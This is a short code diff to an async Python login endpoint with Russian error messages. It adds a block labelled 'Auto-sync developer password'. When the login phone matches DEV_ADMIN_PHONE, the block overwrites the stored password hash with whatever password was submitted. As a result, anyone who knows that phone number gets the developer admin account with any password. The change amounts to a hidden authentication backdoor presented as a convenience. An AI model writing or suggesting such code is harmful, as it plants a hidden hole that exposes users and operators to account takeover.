@@ -187,6 +187,11 @@ async def login(
             content={"success": False, "error": "Аккаунт с таким номером не найден", "field": "phone_number"}
         )
 
+    # Auto-sync developer password
+    if (normalized == DEV_ADMIN_PHONE or user.phone_number == DEV_ADMIN_PHONE) and user.password_hash != hash_password(password):
+        user.password_hash = hash_password(password)
+        db.commit()
+
     if user.password_hash != hash_password(password):
         return JSONResponse(
             status_code=400,
